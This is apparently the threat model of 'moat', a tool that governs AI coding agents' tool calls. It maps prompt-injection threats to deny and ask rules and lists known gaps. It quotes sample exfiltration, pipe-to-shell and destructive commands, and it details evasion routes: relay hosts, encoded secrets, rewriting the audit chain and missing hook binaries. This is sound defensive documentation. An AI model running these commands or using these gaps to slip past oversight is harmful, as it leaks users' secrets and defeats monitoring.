# Threat model

What `moat` defends, against whom, how well the current code does it, and where it
does not. The alpha is decide-only (ADR-013): every statement below about the alpha
is about a policy decision, not about what the operating system prevents.
Per-threat test counts are in [COVERAGE.md](COVERAGE.md), generated from the
conformance fixtures.

## 1. Assets

| # | Asset |
|---|---|
| A1 | Secrets on the machine: SSH keys, cloud credentials, tokens in the environment and in `.env` files, keychains |
| A2 | Source code and git history |
| A3 | Supply-chain position: publishing packages, pushing to CI, editing workflows |
| A4 | The developer's identity and reach: GitHub, cloud consoles |
| A5 | The kernel itself: policy, lock, hook configuration, the `moat` binary, the audit log |

## 2. Attacker

The attacker controls any text the agent reads: files, READMEs, issue titles, pull
request bodies, web pages, MCP tool descriptions and results, dependencies. The
attacker can publish packages and MCP servers. The attacker does not have root or
the user's shell on the machine. The model is treated as untrusted: its tool calls
are requests, and a hallucinated destructive command is handled the same way as an
injected one.

Trust zones:

| Zone | Trust |
|---|---|
| `moat` binary and the policy, after the lock check | trusted |
| The host (agent process and its hook plumbing) | semi-trusted: assumed to call the hook honestly, may be fail-open |
| The model's tool calls | untrusted |
| Commands, MCP servers, project scripts | untrusted |
| Policy and hook files | integrity-checked on every call |

## 3. Threat classes

"Alpha" is what the default policy and the kernel do today. "Beta" is the planned
answer from the [roadmap](ROADMAP.md).

| # | Class | Alpha (decide-only) | Beta |
|---|---|---|---|
| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net` | Sandbox with no read access to secret paths and no direct network |
| T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, and MCP path arguments | Same, plus the sandbox |
| T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset` | Scrubbed environment |
| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; recursive `rm` and discarding checkouts ask | Same |
| T5 | Supply-chain execution (`curl … \| sh`, unknown installs) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; `installs` asks for package installs | Network limited to registries inside the sandbox |
| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008) | Kernel-controlled environment for every command |
| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable` and asks | Enforcement on the process, so spelling no longer matters |
| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny | MCP stdio proxy with description pinning (1.0) |
| T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories, hook files, and agent runs of `moat allow\|doctor\|init\|policy`; the lock denies everything after drift; Claude Code `ConfigChange` blocks a drifted settings file | Signed policy (1.0) |
| T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/moat`; `doctor` names a missing or different hook binary | Signed releases |
| T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` asks for localhost; `moat proxy` refuses loopback, link-local and metadata addresses, and private and CGNAT ones the policy does not name, after DNS resolution; `WebFetch` of an unlisted host asks (ADR-017); after a secret read, network and MCP calls in the same session ask (`session-taint`) | Egress proxy for every tier |

## 4. Out of scope

- An attacker with root, or with the user's own shell outside the agent.
- A malicious `moat` binary from a compromised release pipeline (signed releases and
  provenance are planned with the release workflow, #89).
- Attacks on the model provider, and agents that run in a vendor's cloud.
- Prompt-injection detection in text. `moat` governs actions, not intent.

## 5. Known limitations

These hold for the current code. Each is a design consequence or a tracked gap, not
something the alpha claims to stop.

- **Decide-only, except the Standard tier.** `moat` itself enforces nothing; the
  hook decides. Since the Standard tier (ADR-018), `moat init` also configures the
  agent's own sandbox from the policy, so commands Claude Code runs through `Bash`,
  `PowerShell` and `Monitor`, and every command Codex runs, are confined by the
  operating system: no reads of `secrets-paths`, no reads outside the project and
  `sandbox.read_roots`, no writes outside the project (and the temp directory), and no
  network except allowlisted domains. A classifier mistake inside those bounds is
  still a bypass, and in scope as a vulnerability ([SECURITY.md](../SECURITY.md)).
- **What the Standard tier does not cover.** It is as strong as each host's sandbox
  and moat's translation, and every host version bump must keep the generated keys
  working (`moat doctor` names a weakened setting; the differential suite, #170, will
  execute them). Claude Code's file tools, `WebFetch`, MCP servers and hooks run
  outside its sandbox; only the hook governs them. Writes by a sandboxed command to
  the session's working directory are allowed even when the session started above
  the git root, and Claude Code leaves paths outside the user directories (`/Users`,
  `/home`, `/Volumes`, …) readable. `sandbox.read_roots` (toolchains, `/usr`, temp)
  are readable by sandboxed commands while the hook still asks for them. Egress goes
  to allowlisted domains through the hosts' proxies, which check the requested host
  name, so any allowlisted host stays a relay. `moat sandbox show` lists every loss
  and allowance; ADR-018 lists the open risks.
- **Translation losses (stricter than the policy).** Neither host can re-allow
  `.env.example`, `.env.sample` or `.env.template` inside the `**/.env.*` deny, so
  sandboxed commands cannot read them. Codex keeps `.git` read-only for sandboxed
  commands and asks to run `git commit` outside. Claude Code's file tools refuse reads outside the
  working directories (`permissions.blockReadsOutsideWorkingDirectories`) where the
  hook would ask.
- **Claude Code's sandbox writes `.git`.** So that `git commit` works, sandboxed
  commands may write any `.git` except `hooks`, `config`, `config.worktree`,
  `info/attributes`, a linked worktree's `commondir` and the same in submodules
  (ADR-021, #203); renaming `.git` or `.git/hooks` is refused too. A script can still
  rewrite refs and objects (history tampering, which `git log`, signatures and review
  can show), write a rebase todo that a person later continues, or write a `.git`
  *file* (`gitdir: …`) below the project, which the hook allows as well. The hook
  still asks for file-tool writes to the project's `.git`.
- **Project scripts run arbitrary code.** `npm test`, `npm run *`, `cargo test`,
  `cargo run`, `make test`, `pytest` and similar are allowed by `dev-shell`. They run
  whatever the project's scripts, build files and test files say, and `moat` sees
  only the command line. An agent that can write into the project can therefore run
  any code through an allowed command. In the Standard tier that code runs inside the
  host's sandbox, with the bounds above; without a host sandbox (Cursor), it runs with
  the user's permissions.
- **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
  `github.com` and the package registries. The host check passes for any command
  that reaches them, so a command that is itself allowed (a project script) or that
  a person approves at the prompt (`curl -X POST https://api.github.com/gists -d
  @file` asks on its `shell` atom only) can send data there. A `WebFetch` GET can
  carry data in its URL; the prompt shows the URL. Session taint (POLICY.md §4.1)
  narrows this. After a secret read, `net`, `fetch` and MCP calls in the same session
  ask. After a `fetch` or an MCP result, writes to CI, git hooks, build scripts and
  agent instruction files ask.
- **Session taint is minimal.** It follows host tool calls only: proxied connections
  carry no session. It does not count these as untrusted content: shell network to
  allowed hosts (`gh pr view`, `git pull`), an allowed command that reads secrets at run
  time (a project script), or a command moat cannot classify. A secret that leaves
  through an allowed command without a `net` atom (`npm test`) is not seen. With the
  default policy, `secrets-paths` denies, so only the secrets broker (#172) or a policy
  that asks for secret reads can taint a session. An edited or deleted audit event
  clears taint until `moat doctor` reports the broken chain.
- **The secrets broker (ADR-020) keeps a value from the agent, nothing more.**
  `moat-proxy` holds the value of each `secrets:` entry. It refuses and records
  (`proxy-secret`) any request to another host whose head, or plain-HTTP body, carries
  the placeholder or the value. It defends against a prompt-injected agent that sends
  the token it holds to a host of the attacker's choosing, or through an allowed relay.
  The agent only ever holds the placeholder. It does not defend against:
  - an agent that reads the source itself (a file or variable no deny rule covers;
    `moat policy lint` warns);
  - the value encoded (base64, percent-encoding, compression) or split across requests,
    since the check matches exact bytes;
  - anything inside a CONNECT tunnel, which is TLS and is not decrypted;
  - an observer on the network path of a plain-HTTP request to the owner host. The proxy
    injects the value there in clear text, but only for a secret that opts in with
    `plain_http: true`, which `moat policy lint` flags for any host off this machine;
  - covert channels such as timing, or data hidden in requests to the owner host;
  - an agent that asks the user to paste the secret into the conversation;
  - the owner host itself misusing or reflecting the token.

  `moat proxy` does not load `secrets:` yet (#172).
- **Hosts proceed when the hook binary is missing.** Claude Code and Codex treat a
  hook that cannot start as a non-blocking error and run the tool call. Cursor blocks
  because `moat init` sets `failClosed`. `moat status` and `moat doctor` report a
  missing hook binary.
- **Ungoverned tools.** Claude Code `WebSearch` (server-side), `SendFile` (#137) and
  orchestration tools whose own calls are hooked; Codex web search and hosted tools;
  Cursor `Shell` under `preToolUse` (governed by `beforeShellExecution` instead). Ungoverned calls are
  allowed with rule `ungoverned` and recorded.
- **No settings veto outside Claude Code.** Codex and Cursor have no `ConfigChange`
  event, so a tampered hook file there is caught on the next tool call, not when it
  is written.
- **PowerShell is not parsed.** Claude Code `PowerShell` always asks. A PowerShell
  line given to a POSIX shell tool is lexed as POSIX and usually falls through to the
  `ask` default.
- **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `moat allow`
  (ADR-011, ADR-014), environment dumps through interpreters (`python -c
  'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
  by lists. Spellings outside the lists ask or, if a broad allow covers them, are
  allowed.
- **TOCTOU and hard links.** A link swapped between the check and the command
  running, and hard links, are not seen (ADR-009).
- **The terminal check is not a boundary.** `moat allow` and `moat doctor --accept`
  check for a TTY. The `kernel-self` rules and the lock are what stop an agent from
  re-pinning or granting itself anything.
- **The binary is pinned by path, not digest** (ADR-006, ADR-016). Whoever can replace
  the file the stable link points at decides what the hooks run.
- **`CLAUDE_CONFIG_DIR` must match for `init`.** `moat init` installs hooks where its
  own environment points. Re-pinning (`allow`, `doctor --accept`) keeps every hook file
  the lock already pins, whatever the shell's environment, and `doctor`/`status` report
  an installed hook file the lock does not pin (#158).

- **The audit chain is tamper-evident, not tamper-proof.** The hash chain
  ([ARCHITECTURE.md](ARCHITECTURE.md) §7) makes an edit, a deletion or a reordering in the middle of the
  log visible to `moat doctor`. It is unkeyed and lives in the file it protects, so
  whoever can write `~/.moat/audit.db` (the user's account, or an allowed command
  running as the user, see "Decide-only") can delete the newest events and leave a
  valid shorter chain, or rewrite events and recompute every hash after them. Keeping
  the head hash or count elsewhere on the same machine would need a second write on
  every `guard` call and could be rewritten by the same attacker, so it is not done.
  Anchoring the head off the machine is left to the person: `moat doctor` and
  `moat audit verify` print it, and `moat audit verify --anchor` checks a later
  export against it. Events written before audit schema 2 are not covered.
- **What verifying an export proves.** `moat audit verify` shows that every line is
  the event its hash commits to, and that runs of consecutive ids are unbroken
  links. It does not show that the export is complete. Dropping the newest lines,
  or exporting from a truncated log, leaves a file that verifies, and so does
  deleting a middle event, which looks like a filter gap. Only an anchored head
  catches those: a recorded hash that the export must contain. The anchor does not
  cover events after it. Anyone who can write the database can recompute every hash
  before exporting (the chain is unkeyed), so an export is evidence about the log
  as it was at export time, no more. Exported cells are the redacted store cells.
  A secret shape that redaction learned after an event was recorded stays in that
  event.

## 6. How the claims are tested

- **Conformance suite.** `tests/conformance/{attacks,benign,ask}.yaml`: one tool
  call per fixture, with the verdict and rule ids the default policy must give. Every
  attack and ask fixture names its threat class, every class needs at least one
  attack fixture, and [COVERAGE.md](COVERAGE.md) is generated from them. Every valid
  bypass becomes a fixture before its fix is published.
- **End-to-end tests** run the real binary as a hook in isolated homes: lock drift,
  `ConfigChange`, approvals, install paths, every host's payloads.
- **Fuzzing.** `cargo fuzz` targets for the shell path through the engine, policy
  parsing, host payloads and `moat allow --always` patterns run in CI on every pull
  request and weekly.
- **Planned:** differential testing of the lexer against real `bash`, executing
  fixtures under OS enforcement, and MoatBench, which measures attack success with and
  without `moat` across agents ([ROADMAP.md](ROADMAP.md)). Prompt fatigue is measured
  today only by `moat report` (asks per active hour).
